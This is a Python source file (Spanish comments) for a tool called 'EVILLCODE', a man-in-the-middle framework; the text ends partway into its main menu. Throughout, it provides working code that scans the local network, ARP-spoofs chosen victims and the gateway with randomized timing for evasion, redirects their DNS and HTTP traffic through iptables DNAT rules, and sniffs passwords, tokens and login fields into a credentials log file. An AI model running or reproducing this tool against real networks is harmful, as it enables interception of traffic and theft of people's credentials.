#!/usr/bin/env python3

import shutil
import subprocess
import sys
import re
import time
import threading
import warnings
import logging
import socket
import os
import random

# ─── IMPORTACIÓN DE COLORAMA ────────────────────────────────────────────────
try:
    from colorama import init, Fore, Style
    init(autoreset=False)
    COLORAMA_INSTALLED = True
except ImportError:
    class FallbackColor:
        def __getattr__(self, name):   # Bug corregido: faltaba parámetro 'name'
            return ""
    Fore = FallbackColor()
    Style = FallbackColor()
    COLORAMA_INSTALLED = False

# ─── IMPORTACIÓN DE PYFIGLET ────────────────────────────────────────────────
try:
    import pyfiglet
    PYFIGLET_INSTALLED = True
except ImportError:
    PYFIGLET_INSTALLED = False

# ─── CONFIGURACIÓN Y SUPRESIÓN DE SCAPY ─────────────────────────────────────
warnings.filterwarnings("ignore", category=UserWarning, module="scapy")
warnings.filterwarnings("ignore", category=UserWarning, module="scapy.sendrecv")

try:
    from scapy.all import ARP, Ether, send, srp1, conf, sendp, sniff, IP, TCP, Raw
    conf.verb = 0
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    logging.getLogger("scapy.runtime").propagate = False
    SCAPY_INSTALLED = True
except ImportError:
    SCAPY_INSTALLED = False

# ─── GLOBALES Y CONSTANTES ──────────────────────────────────────────────────
MAIN_COLOR    = Fore.GREEN
ACCENT_COLOR  = Fore.CYAN
ERROR_COLOR   = Fore.RED
WARNING_COLOR = Fore.YELLOW
STOP_EVENT    = threading.Event()
CREDENTIALS_LOG   = "credenciales_capturadas.txt"
IPTABLES_RULE_TAG = "MITM_FW"

# ─── CARACTERES UNICODE PARA TABLA ──────────────────────────────────────────
L_H = '─'; L_V = '│'; C_TL = '╭'; C_TR = '╮'; C_BL = '╰'; C_BR = '╯'
C_SEP = '┼'; C_T_DOWN = '┬'; C_T_UP = '┴'; C_T_RIGHT = '├'; C_T_LEFT = '┤'

# ─── BANNER ─────────────────────────────────────────────────────────────────
print(f"{ERROR_COLOR}")
print(" ███████╗██╗   ██╗██╗██╗     ██╗      ██████╗ ██████╗ ██████╗ ███████╗")
print(" ██╔════╝██║   ██╗██║██║     ██║     ██╔════╝██╔═══██╗██╔══██╗██╔════╝")
print(" █████╗  ██║   ██╗██║██║     ██║     ██║     ██║   ██║██║  ██║█████╗  ")
print(" ██╔══╝  ╚██╗ ██╔╝██║██║     ██║     ██║     ██║   ██║██║  ██║██╔══╝  ")
print(" ███████╗ ╚████╔╝ ██║███████╗███████╗╚██████╗╚██████╔╝██████╔╝███████╗")
print(" ╚══════╝  ╚═══╝  ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝")
print(f"{Style.RESET_ALL}")

ANCHO_TOTAL     = 70
LINEA_GITHUT    = "GitHut: AlexanderOrtizScript"
LINEA_CREADOR   = "Creado por Alexander Ortiz"
LINEA_EDUCACION = "v1.0.0 (Modular MITM Framework)"

print(f"{ACCENT_COLOR}{LINEA_GITHUT.center(ANCHO_TOTAL)}{Style.RESET_ALL}")
print(f"{ACCENT_COLOR}{LINEA_CREADOR.center(ANCHO_TOTAL)}{Style.RESET_ALL}")
print(f"{ACCENT_COLOR}{LINEA_EDUCACION.center(ANCHO_TOTAL)}{Style.RESET_ALL}")
print("\n")

# ─── VERIFICACIÓN DE DEPENDENCIAS ───────────────────────────────────────────
def verificar_y_mostrar(nombre):
    estado_OK = f"{MAIN_COLOR}{Style.BRIGHT}OK{Style.RESET_ALL}"
    estado_X  = f"[ {ERROR_COLOR}X{Style.RESET_ALL} ]"

    if nombre in ["colorama", "pyfiglet", "scapy", "iptables"]:
        if nombre == "colorama":   instalado = COLORAMA_INSTALLED
        elif nombre == "pyfiglet": instalado = PYFIGLET_INSTALLED
        elif nombre == "scapy":    instalado = SCAPY_INSTALLED
        elif nombre == "iptables": instalado = shutil.which("iptables") is not None

        if instalado:
            print(f" {estado_OK} Módulo/Herramienta {ACCENT_COLOR}{nombre}{Style.RESET_ALL} instalado")
            return True
        else:
            print(f" {estado_X} Herramienta/Módulo {ACCENT_COLOR}{nombre}{Style.RESET_ALL} NO instalada")
            return False  # Bug corregido: antes no retornaba False aquí

    elif shutil.which(nombre):
        print(f" {estado_OK} Herramienta {ACCENT_COLOR}{nombre}{Style.RESET_ALL} instalada")
        return True
    else:
        print(f" {estado_X} Herramienta/Módulo {ACCENT_COLOR}{nombre}{Style.RESET_ALL} NO instalada")
        return False

OK_TITLE = f"{MAIN_COLOR}[OK]{Style.RESET_ALL}"
print(f"\n{OK_TITLE} Comprobando dependencias...{Style.RESET_ALL}")

herramientas_necesarias = ["nmap", "colorama", "pyfiglet", "scapy", "iptables"]
todo_instalado = all(verificar_y_mostrar(h) for h in herramientas_necesarias)

if not todo_instalado:
    print(f"\n{ERROR_COLOR}Error: Faltan dependencias. Instálalas e inténtalo de nuevo.{Style.RESET_ALL}")
    print(f"\n{ACCENT_COLOR}--- Instalación Kali Linux ---{Style.RESET_ALL}")
    print(f"{ACCENT_COLOR}Herramientas:{Style.RESET_ALL}")
    print(f"{MAIN_COLOR}sudo apt install nmap python3-pip -y{Style.RESET_ALL}")
    print(f"\n{ACCENT_COLOR}Python Módulos:{Style.RESET_ALL}")
    print(f"{MAIN_COLOR}sudo pip3 install colorama pyfiglet scapy --break-system-packages{Style.RESET_ALL}")
    sys.exit(1)

# ─── VERIFICAR PERMISOS ROOT ─────────────────────────────────────────────────
if os.geteuid() != 0:
    print(f"\n{ERROR_COLOR}[!] Este script requiere permisos root.{Style.RESET_ALL}")
    print(f"{ACCENT_COLOR}    Ejecuta: sudo python3 evillcode.py{Style.RESET_ALL}")
    sys.exit(1)

# ─── LISTAR INTERFACES REALES DEL SISTEMA ───────────────────────────────────
def listar_interfaces():
    """Detecta interfaces de red activas reales (no hardcodeadas)."""
    interfaces = []
    try:
        resultado = subprocess.run(
            ["ip", "-o", "-4", "addr", "show"],
            capture_output=True, text=True
        )
        for linea in resultado.stdout.splitlines():
            partes = linea.split()
            if len(partes) >= 2:
                iface = partes[1]
                if iface != "lo" and iface not in interfaces:
                    interfaces.append(iface)
    except Exception:
        pass

    if not interfaces:
        try:
            for iface in os.listdir('/sys/class/net'):
                if iface != 'lo' and iface not in interfaces:
                    interfaces.append(iface)
        except Exception:
            interfaces = ["eth0", "wlan0"]

    return interfaces

# ─── OBTENER IP DEL ATACANTE ─────────────────────────────────────────────────
def obtener_ip_atacante(interfaz):
    """Obtiene la IP del atacante con múltiples métodos de respaldo."""
    try:
        r = subprocess.run(["ip", "-4", "addr", "show", interfaz],
                           capture_output=True, text=True, check=True)
        m = re.search(r'inet\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', r.stdout)
        if m:
            return m.group(1)
    except Exception:
        pass

    try:
        import fcntl, struct
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ip = socket.inet_ntoa(fcntl.ioctl(
            s.fileno(), 0x8915,
            struct.pack('256s', interfaz[:15].encode('utf-8'))
        )[20:24])
        return ip
    except Exception:
        pass

    return None

# ─── OBTENER MAC DEL ATACANTE ────────────────────────────────────────────────
def obtener_mac_atacante(interfaz):
    """Obtiene la MAC del atacante con múltiples métodos de respaldo."""
    try:
        with open(f"/sys/class/net/{interfaz}/address") as f:
            mac = f.read().strip()
            if re.match(r'^([0-9a-f]{2}:){5}[0-9a-f]{2}$', mac):
                return mac.upper()
    except Exception:
        pass

    try:
        r = subprocess.run(["ip", "link", "show", interfaz],
                           capture_output=True, text=True, check=True)
        m = re.search(r'ether\s+([0-9a-f:]{17})', r.stdout)
        if m:
            return m.group(1).upper()
    except Exception:
        pass

    return None

# ─── OBTENER PUERTA DE ENLACE (DETECCIÓN REAL) ───────────────────────────────
def obtener_gateway(interfaz):
    """Detecta la puerta de enlace real. No asume .1"""
    try:
        r = subprocess.run(["ip", "route", "show", "dev", interfaz],
                           capture_output=True, text=True, check=True)
        for linea in r.stdout.splitlines():
            m = re.search(r'default\s+via\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', linea)
            if m:
                return m.group(1)
    except Exception:
        pass

    try:
        r = subprocess.run(["ip", "route", "show", "default"],
                           capture_output=True, text=True)
        m = re.search(r'default\s+via\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', r.stdout)
        if m:
            return m.group(1)
    except Exception:
        pass

    try:
        with open("/proc/net/route") as f:
            for linea in f.readlines()[1:]:
                campos = linea.strip().split()
                if campos[1] == '00000000' and campos[7] == '00000000':
                    gw_bytes = bytes.fromhex(campos[2])[::-1]
                    return socket.inet_ntoa(gw_bytes)
    except Exception:
        pass

    return None

# ─── OBTENER HOSTNAME ────────────────────────────────────────────────────────
def obtener_hostname(ip):
    """Resuelve el nombre del equipo por DNS inversa con timeout."""
    try:
        socket.setdefaulttimeout(1)
        name, _, _ = socket.gethostbyaddr(ip)
        return name.split('.')[0]
    except Exception:
        return 'Libre'
    finally:
        socket.setdefaulttimeout(None)

# ─── OBTENER MAC DESDE TABLA ARP DEL SISTEMA ────────────────────────────────
def obtener_mac_de_arp_sistema(ip):
    """Lee la MAC de la tabla ARP del sistema sin enviar paquetes."""
    try:
        r = subprocess.run(["arp", "-n", ip], capture_output=True, text=True)
        m = re.search(r'([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})', r.stdout)
        if m:
            return m.group(1).upper()
    except Exception:
        pass

    try:
        with open("/proc/net/arp") as f:
            for linea in f.readlines()[1:]:
                campos = linea.split()
                if campos and campos[0] == ip and campos[2] == '0x2':
                    return campos[3].upper()
    except Exception:
        pass

    return None

# ─── ESCANEO DE RED ──────────────────────────────────────────────────────────
def escanear_red_y_obtener_hosts(interfaz):
    print(f"\n{ACCENT_COLOR}>>> escaneando{Style.RESET_ALL}")

    subred = None
    try:
        r = subprocess.run(["ip", "-4", "a", "show", interfaz],
                           capture_output=True, text=True, check=True)
        m = re.search(r'inet\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2})', r.stdout)
        if m:
            subred = m.group(1)
    except Exception:
        pass

    if not subred:
        print(f"{WARNING_COLOR}[!] Subred no detectada. Usando 192.168.1.0/24 por defecto.{Style.RESET_ALL}")
        subred = "192.168.1.0/24"


    hosts      = []
    nmap_output = None

    try:
        nmap_cmd = ["nmap", "-sn", "-n", "-PR", "--host-timeout", "10s", subred]
        nmap_output = subprocess.run(nmap_cmd, capture_output=True, text=True, timeout=120)
    except subprocess.TimeoutExpired:
        print(f"{WARNING_COLOR}[!] Nmap tardó demasiado. Continuando con resultados parciales.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{WARNING_COLOR}[!] Error en nmap: {e}{Style.RESET_ALL}")

    ip_pattern  = re.compile(r'Nmap scan report for (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
    mac_pattern = re.compile(r'MAC Address: ((?:[0-9A-Fa-f]{2}[:\-]){5}[0-9A-Fa-f]{2})\s+\((.*?)\)')

    current_ip = None
    hostname   = 'Libre'

    if nmap_output and nmap_output.returncode == 0:
        for line in nmap_output.stdout.splitlines():
            ip_match = ip_pattern.search(line)
            if ip_match:
                current_ip = ip_match.group(1)
                hostname = '_gateway' if (current_ip.endswith('.1') or current_ip.endswith('.254')) else 'Libre'

            mac_match = mac_pattern.search(line)
            if mac_match and current_ip:
                mac     = mac_match.group(1).replace('-', ':').upper()
                vendor  = mac_match.group(2).strip()
                hn      = hostname if hostname != 'Libre' else (vendor if vendor else 'Libre')
                hosts.append({"ip": current_ip, "mac": mac, "hostname": hn, "status": "Libre"})
                current_ip = None

        # Registrar IPs sin MAC (ej: el propio equipo atacante)
        for line in nmap_output.stdout.splitlines():
            ip_match = ip_pattern.search(line)
            if ip_match:
                ip_enc = ip_match.group(1)
                if not any(h['ip'] == ip_enc for h in hosts):
                    mac_sys = obtener_mac_de_arp_sistema(ip_enc)
                    hn = '_gateway' if (ip_enc.endswith('.1') or ip_enc.endswith('.254')) else 'Libre'
                    hosts.append({
                        "ip": ip_enc, "mac": mac_sys if mac_sys else "N/A",
                        "hostname": hn, "status": "Libre"
                    })

    if not hosts:
        print(f"{WARNING_COLOR}[!] Sin resultados. Verifica que la interfaz esté activa y ejecutas como root.{Style.RESET_ALL}")

    # Barra de progreso visual
    max_carga = 256
    for i in range(1, 101):
        filled = int(50 * i / 100)
        bar = '█' * filled + '-' * (50 - filled)
        sys.stdout.write(f"\r{MAIN_COLOR}{i:3}% {bar}{Style.RESET_ALL} {MAIN_COLOR}{max_carga*i//100}/{max_carga}{Style.RESET_ALL}")
        sys.stdout.flush()
        if i < 100:
            time.sleep(0.01)

    print(f"\r{MAIN_COLOR}100% {'█'*50}{Style.RESET_ALL} {MAIN_COLOR}{max_carga}/{max_carga}{Style.RESET_ALL}")
    print(f"{MAIN_COLOR}{len(hosts)} equipos descubiertos.{Style.RESET_ALL}")
    print(f"{ACCENT_COLOR}>>> equipos{Style.RESET_ALL}")
    return hosts

# ─── MOSTRAR TABLA DE HOSTS ──────────────────────────────────────────────────
def mostrar_tabla_hosts(hosts):
    if not hosts:
        print(f"{ERROR_COLOR}No se descubrieron equipos.{Style.RESET_ALL}")
        return

    TC = MAIN_COLOR

    # Calcular anchos de columna
    ai = max(len(str(len(hosts) - 1)), len("ID"))
    ap = max(max(len(h['ip'])       for h in hosts), len("Dirección-IP"))
    am = max(max(len(h['mac'])      for h in hosts), len("Dirección-MAC"))
    ah = max(max(len(h['hostname']) for h in hosts), len("Nombre-Equipo"))
    ae = max(max(len(h['status'])   for h in hosts), len("Estado"))

    LI = L_H * (ai + 2)
    LP = L_H * (ap + 2)
    LM = L_H * (am + 2)
    LH = L_H * (ah + 2)
    LE = L_H * (ae + 2)

    linea_top    = f"{TC}{C_TL}{LI}{C_T_DOWN}{LP}{C_T_DOWN}{LM}{C_T_DOWN}{LH}{C_T_DOWN}{LE}{C_TR}{Style.RESET_ALL}"
    linea_sep    = f"{TC}{C_T_RIGHT}{LI}{C_SEP}{LP}{C_SEP}{LM}{C_SEP}{LH}{C_SEP}{LE}{C_T_LEFT}{Style.RESET_ALL}"
    linea_bottom = f"{TC}{C_BL}{LI}{C_T_UP}{LP}{C_T_UP}{LM}{C_T_UP}{LH}{C_T_UP}{LE}{C_BR}{Style.RESET_ALL}"

    def fila(id_val, ip_val, mac_val, host_val, estado_val, negrita=False):
        b = Style.BRIGHT if negrita else ""
        return (
            f"{TC}{L_V}{Style.RESET_ALL} "
            f"{TC}{b}{id_val:<{ai}}{Style.RESET_ALL} {TC}{L_V}{Style.RESET_ALL} "
            f"{TC}{b}{ip_val:<{ap}}{Style.RESET_ALL} {TC}{L_V}{Style.RESET_ALL} "
            f"{TC}{b}{mac_val:<{am}}{Style.RESET_ALL} {TC}{L_V}{Style.RESET_ALL} "
            f"{TC}{b}{host_val:<{ah}}{Style.RESET_ALL} {TC}{L_V}{Style.RESET_ALL} "
            f"{TC}{b}{estado_val:<{ae}}{Style.RESET_ALL} {TC}{L_V}{Style.RESET_ALL}"
        )

    print(f"\n{TC}Hosts{Style.RESET_ALL}")
    print(linea_top)
    print(fila("ID", "Dirección-IP", "Dirección-MAC", "Nombre-Equipo", "Estado", negrita=True))
    print(linea_sep)
    for i, h in enumerate(hosts):
        print(fila(str(i), h['ip'], h['mac'], h['hostname'], h['status']))
    print(linea_bottom)

# ─── OBTENER MAC REMOTA ──────────────────────────────────────────────────────
def obtener_mac_remota(ip, interfaz, reintentos=7, delay=2):
    """Obtiene la MAC de un equipo. Primero tabla ARP, luego Scapy con reintentos."""
    mac_local = obtener_mac_de_arp_sistema(ip)
    if mac_local:
        return mac_local

    for intento in range(reintentos):
        try:
            paquete   = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
            respuesta = srp1(paquete, iface=interfaz, timeout=3, verbose=False)
            if respuesta:
                return respuesta.hwsrc.upper()
            if intento < reintentos - 1:
                print(f"{ACCENT_COLOR}  -> Sin respuesta de {ip}. Reintentando ({intento+1}/{reintentos})...{Style.RESET_ALL}")
                time.sleep(delay)
        except Exception as e:
            if intento < reintentos - 1:
                print(f"{ERROR_COLOR}  -> Error consultando {ip}: {e}. Reintentando ({intento+1}/{reintentos})...{Style.RESET_ALL}")
                time.sleep(delay)

    print(f"{ERROR_COLOR}[!] No se pudo obtener MAC de {ip} tras {reintentos} intentos.{Style.RESET_ALL}")
    return None

# ─── RESTAURAR ENTRADA ARP ───────────────────────────────────────────────────
def restaura_arp(ip_destino, ip_origen, mac_origen, mac_destino, interfaz, count=15):
    """Restaura la tabla ARP enviando paquetes ARP legítimos (agresivo)."""
    try:
        pkt = Ether(src=mac_origen, dst=mac_destino) / ARP(
            op=2, pdst=ip_destino, hwdst=mac_destino,
            psrc=ip_origen, hwsrc=mac_origen
        )
        sendp(pkt, iface=interfaz, verbose=False, count=count)
    except Exception as e:
        print(f"{WARNING_COLOR}[!] Error al restaurar ARP para {ip_destino}: {e}{Style.RESET_ALL}")

# ─── CONFIGURAR IPTABLES ─────────────────────────────────────────────────────
def configurar_mitm_activo(interfaz, atacante_ip):
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"],
                   check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for proto, puerto in [("udp", "53"), ("tcp", "80")]:
        subprocess.run(
            ["iptables", "-t", "nat", "-D", "PREROUTING", "-i", interfaz,
             "-p", proto, "--dport", puerto, "-j", "DNAT",
             "--to-destination", atacante_ip, "-m", "comment", "--comment", IPTABLES_RULE_TAG],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        subprocess.run(
            ["iptables", "-t", "nat", "-A", "PREROUTING", "-i", interfaz,
             "-p", proto, "--dport", puerto, "-j", "DNAT",
             "--to-destination", atacante_ip, "-m", "comment", "--comment", IPTABLES_RULE_TAG],
            check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
    print(f"\n{MAIN_COLOR}[✓] IP Forwarding habilitado. Redirección HTTP/DNS configurada.{Style.RESET_ALL}")

def restaurar_mitm_activo(interfaz, atacante_ip):
    print(f"{MAIN_COLOR}Restaurando configuración del sistema...{Style.RESET_ALL}")
    for proto, puerto in [("udp", "53"), ("tcp", "80")]:
        subprocess.run(
            ["iptables", "-t", "nat", "-D", "PREROUTING", "-i", interfaz,
             "-p", proto, "--dport", puerto, "-j", "DNAT",
             "--to-destination", atacante_ip, "-m", "comment", "--comment", IPTABLES_RULE_TAG],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(f"{MAIN_COLOR}[✓] IP Forwarding deshabilitado. IPTables restauradas.{Style.RESET_ALL}")

# ─── HILO: SUPLANTACIÓN ARP ──────────────────────────────────────────────────
class ARPThread(threading.Thread):
    """Hilo para Suplantación ARP continua con variación aleatoria (Evasión)."""

    def __init__(self, ip_objetivo, puerta_enlace, mac_objetivo, mac_puerta_enlace, mac_atacante, interfaz):
        super().__init__(daemon=True)
        self.ip_objetivo       = ip_objetivo
        self.puerta_enlace     = puerta_enlace
        self.mac_objetivo      = mac_objetivo
        self.mac_puerta_enlace = mac_puerta_enlace
        self.mac_atacante      = mac_atacante
        self.interfaz          = interfaz
        self.paquetes_enviados = 0

        # Paquete 1: El host cree que el Atacante es la Puerta de Enlace
        self.paquete_host = Ether(src=mac_atacante, dst=mac_objetivo) / ARP(
            op=2, pdst=ip_objetivo, hwdst=mac_objetivo,
            psrc=puerta_enlace, hwsrc=mac_atacante
        )
        # Paquete 2: La Puerta de Enlace cree que el Atacante es el Host
        self.paquete_gw = Ether(src=mac_atacante, dst=mac_puerta_enlace) / ARP(
            op=2, pdst=puerta_enlace, hwdst=mac_puerta_enlace,
            psrc=ip_objetivo, hwsrc=mac_atacante
        )

    def run(self):
        print(f"{ACCENT_COLOR}[SUPLANTACIÓN ARP] Activo: {self.ip_objetivo} <-> {self.puerta_enlace}{Style.RESET_ALL}")
        while not STOP_EVENT.is_set():
            try:
                sendp(self.paquete_host, iface=self.interfaz, verbose=False)
                sendp(self.paquete_gw,   iface=self.interfaz, verbose=False)
                self.paquetes_enviados += 2
            except Exception as e:
                print(f"{WARNING_COLOR}[SUPLANTACIÓN ARP] Error al enviar paquete: {e}{Style.RESET_ALL}")
            time.sleep(random.uniform(0.05, 0.15))  # Variación aleatoria para evasión

# ─── HILO: CAPTURADOR DE CREDENCIALES ───────────────────────────────────────
class SnifferThread(threading.Thread):
    """Hilo para captura de paquetes HTTP (Capa 7) en busca de credenciales."""

    def __init__(self, interfaz):
        super().__init__(daemon=True)
        self.interfaz         = interfaz
        self.capturas_totales = 0

    def procesar_paquete(self, paquete):
        if not (paquete.haslayer(TCP) and paquete.haslayer(Raw)):
            return
        if paquete[TCP].dport not in [80, 8080]:
            return
        try:
            datos_raw = paquete[Raw].load.decode(errors='ignore')
        except Exception:
            return

        palabras_clave = [
            "password=", "passwd=", "pass=", "pws=",
            "user=", "username=", "login=", "email=",
            "auth=", "token=", "POST", "Authorization:"
        ]

        if any(k in datos_raw for k in palabras_clave):
            self.capturas_totales += 1
            ip_origen  = paquete[IP].src if paquete.haslayer(IP) else "Desconocida"
            puerto_dst = paquete[TCP].dport

            entrada_log = (
                f"\n{'─'*55}\n"
                f"[CAPTURA #{self.capturas_totales}]  Hora: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"ORIGEN : {ip_origen}  →  Puerto: {puerto_dst}\n"
                f"DATOS  :\n{datos_raw}\n"
                f"{'─'*55}\n"
            )
            try:
                with open(CREDENTIALS_LOG, "a", encoding="utf-8") as f:
                    f.write(entrada_log)
                print(f"\n{WARNING_COLOR}[CAPTURADOR] ¡Credenciales detectadas! Origen: {ip_origen} → {CREDENTIALS_LOG}{Style.RESET_ALL}")
            except IOError as e:
                print(f"{ERROR_COLOR}[CAPTURADOR] Error al escribir log: {e}{Style.RESET_ALL}")

    def run(self):
        print(f"{ACCENT_COLOR}[CAPTURADOR] Activo en {self.interfaz} (puertos 80, 8080).{Style.RESET_ALL}")
        try:
            sniff(
                iface=self.interfaz,
                filter="tcp port 80 or tcp port 8080",
                prn=self.procesar_paquete,
                store=0,
                stop_filter=lambda x: STOP_EVENT.is_set()
            )
        except Exception as e:
            print(f"{ERROR_COLOR}[CAPTURADOR] Error en captura: {e}{Style.RESET_ALL}")

# ─── HILO: MONITOR DE RED ────────────────────────────────────────────────────
class NetworkMonitor(threading.Thread):
    """Hilo para detectar nuevos equipos en la red periódicamente."""

    def __init__(self, interfaz, hosts_descubiertos, intervalo_segundos=60):
        super().__init__(daemon=True)
        self.interfaz          = interfaz
        self.intervalo         = intervalo_segundos
        self.equipos_conocidos = set(h['ip'] for h in hosts_descubiertos)

    def run(self):
        print(f"{ACCENT_COLOR}[MONITOR] Activo. Revisando nuevos equipos cada {self.intervalo}s.{Style.RESET_ALL}")
        while not STOP_EVENT.is_set():
            if STOP_EVENT.wait(timeout=self.intervalo):
                break
            print(f"\n{ACCENT_COLOR}[MONITOR] Buscando nuevos equipos...{Style.RESET_ALL}")
            try:
                subred = None
                r = subprocess.run(["ip", "-4", "a", "show", self.interfaz],
                                   capture_output=True, text=True)
                m = re.search(r'inet\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2})', r.stdout)
                if m:
                    subred = m.group(1)
                if not subred:
                    continue

                nmap_out = subprocess.run(
                    ["nmap", "-sn", "-n", "-PR", "--host-timeout", "5s", subred],
                    capture_output=True, text=True, timeout=60
                )
                ip_pattern  = re.compile(r'Nmap scan report for (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
                ips_activas = set(ip_pattern.findall(nmap_out.stdout))

                ip_atacante = obtener_ip_atacante(self.interfaz)
                if ip_atacante:
                    ips_activas.discard(ip_atacante)

                nuevos = ips_activas - self.equipos_conocidos
                if nuevos:
                    for nueva_ip in nuevos:
                        print(f"\n{WARNING_COLOR}[MONITOR] ¡NUEVO EQUIPO! IP: {nueva_ip}  Nombre: {obtener_hostname(nueva_ip)}{Style.RESET_ALL}")
                    self.equipos_conocidos.update(nuevos)
                else:
                    print(f"{ACCENT_COLOR}[MONITOR] Sin nuevos equipos.{Style.RESET_ALL}")

            except subprocess.TimeoutExpired:
                print(f"{WARNING_COLOR}[MONITOR] Escaneo tardó demasiado. Continuando...{Style.RESET_ALL}")
            except Exception as e:
                print(f"{WARNING_COLOR}[MONITOR] Error: {e}{Style.RESET_ALL}")

# ─── LÓGICA PRINCIPAL DE ATAQUE MITM ────────────────────────────────────────
def iniciar_ataque_mitm(interfaz, ips_objetivo, hosts_descubiertos):
    """Ejecuta Suplantación ARP + Captura de credenciales + Monitoreo de red."""

    if not ips_objetivo:
        print(f"{ERROR_COLOR}Error: No se seleccionó ningún objetivo.{Style.RESET_ALL}")
        return

    STOP_EVENT.clear()  # Resetear para permitir múltiples ataques sin reiniciar

    hilos_arp         = []
    puerta_enlace     = None
    atacante_ip       = None
    mac_puerta_enlace = None

    try:
        atacante_ip = obtener_ip_atacante(interfaz)
        if not atacante_ip:
            print(f"{ERROR_COLOR}[!] No se pudo obtener la IP del atacante en {interfaz}.{Style.RESET_ALL}")
            return

        mac_atacante = obtener_mac_atacante(interfaz)
        if not mac_atacante:
            print(f"{ERROR_COLOR}[!] No se pudo obtener la MAC del atacante en {interfaz}.{Style.RESET_ALL}")
            return

        puerta_enlace = obtener_gateway(interfaz)
        if not puerta_enlace:
            print(f"{ERROR_COLOR}[!] No se pudo detectar la Puerta de Enlace.{Style.RESET_ALL}")
            return

        print(f"\n{ACCENT_COLOR}Iniciando Ataque de Suplantación ARP (MITM Activo){Style.RESET_ALL}")
        print(f"{ACCENT_COLOR}Objetivos ({len(ips_objetivo)}): {', '.join(ips_objetivo)}{Style.RESET_ALL}")
        print(f"{ACCENT_COLOR}Puerta de Enlace: {puerta_enlace}{Style.RESET_ALL}")
        print(f"{MAIN_COLOR}IP Atacante  : {atacante_ip}{Style.RESET_ALL}")
        print(f"{MAIN_COLOR}MAC Atacante : {mac_atacante}{Style.RESET_ALL}")
        print(f"\n{ACCENT_COLOR}Obteniendo MACs de la Puerta de Enlace y Objetivos...{Style.RESET_ALL}")
        mac_puerta_enlace = obtener_mac_remota(puerta_enlace, interfaz, reintentos=7, delay=2)
        if not mac_puerta_enlace:
            print(f"{ERROR_COLOR}[!] MAC de la Puerta de Enlace no obtenida. Abortando.{Style.RESET_ALL}")
            return

        print(f"{MAIN_COLOR}MAC Puerta de Enlace: {mac_puerta_enlace}{Style.RESET_ALL}")
        configurar_mitm_activo(interfaz, atacante_ip)

        mapa_equipos = {h['ip']: h for h in hosts_descubiertos}

        for ip_objetivo in ips_objetivo:
            if ip_objetivo == puerta_enlace:
                print(f"{WARNING_COLOR}[!] Omitiendo {ip_objetivo} (es la Puerta de Enlace).{Style.RESET_ALL}")
                continue
            if ip_objetivo == atacante_ip:
                print(f"{WARNING_COLOR}[!] Omitiendo {ip_objetivo} (es tu propia IP).{Style.RESET_ALL}")
                continue

            mac_objetivo = mapa_equipos.get(ip_objetivo, {}).get('mac')
            if not mac_objetivo or mac_objetivo == "N/A":
                print(f"{ACCENT_COLOR}Buscando MAC de {ip_objetivo}...{Style.RESET_ALL}")
                mac_objetivo = obtener_mac_remota(ip_objetivo, interfaz, reintentos=7, delay=2)

            if not mac_objetivo:
                print(f"{ERROR_COLOR}[!] Omitiendo {ip_objetivo}: MAC no encontrada.{Style.RESET_ALL}")
                continue

            print(f"{MAIN_COLOR}MAC de {ip_objetivo}: {mac_objetivo}{Style.RESET_ALL}")
            hilo = ARPThread(ip_objetivo, puerta_enlace, mac_objetivo,
                             mac_puerta_enlace, mac_atacante, interfaz)
            hilos_arp.append(hilo)

        if not hilos_arp:
            print(f"{ERROR_COLOR}[!] No hay objetivos válidos. Abortando ataque.{Style.RESET_ALL}")
            restaurar_mitm_activo(interfaz, atacante_ip)
            return

        sniffer = SnifferThread(interfaz)
        monitor = NetworkMonitor(interfaz, hosts_descubiertos, intervalo_segundos=60)

        sniffer.start()
        monitor.start()
        for h in hilos_arp:
            h.start()

        print(f"\n{MAIN_COLOR}Ataque Activo ({len(hilos_arp)} Suplantaciones ARP, 1 Capturador, 1 Monitor).\nPresiona CTRL+C para detener y restaurar.{Style.RESET_ALL}")

        while not STOP_EVENT.is_set():
            time.sleep(1)

    except KeyboardInterrupt:
        print(f"\n{MAIN_COLOR}[!] Interrupción del usuario. Restaurando red...{Style.RESET_ALL}")

    except Exception as e:
        print(f"{ERROR_COLOR}[!] Error crítico: {e}{Style.RESET_ALL}")

    finally:
        STOP_EVENT.set()
        print(f"{MAIN_COLOR}Deteniendo hilos y restaurando tabla ARP...{Style.RESET_ALL}")
        for h in hilos_arp:
            h.join(timeout=2)
            try:
                if mac_puerta_enlace:
                    restaura_arp(h.ip_objetivo, puerta_enlace, mac_puerta_enlace, h.mac_objetivo, interfaz)
                    restaura_arp(puerta_enlace, h.ip_objetivo, h.mac_objetivo, mac_puerta_enlace, interfaz)
            except Exception:
                pass
        if atacante_ip:
            restaurar_mitm_activo(interfaz, atacante_ip)
        print(f"\n{ACCENT_COLOR}Script finalizado. Credenciales capturadas guardadas en: {CREDENTIALS_LOG}{Style.RESET_ALL}")

# ─── MENÚ PRINCIPAL ──────────────────────────────────────────────────────────
if __name__ == "__main__":

    interfaces_disponibles = listar_interfaces()

    if not interfaces_disponibles:
        print(f"{ERROR_COLOR}[!] No se encontraron interfaces de red activas.{Style.RESET_ALL}")
        sys.exit(1)

    print(f"\n{OK_TITLE} Interfaces de red disponibles:{Style.RESET_ALL}")
    interfaz_map = {}
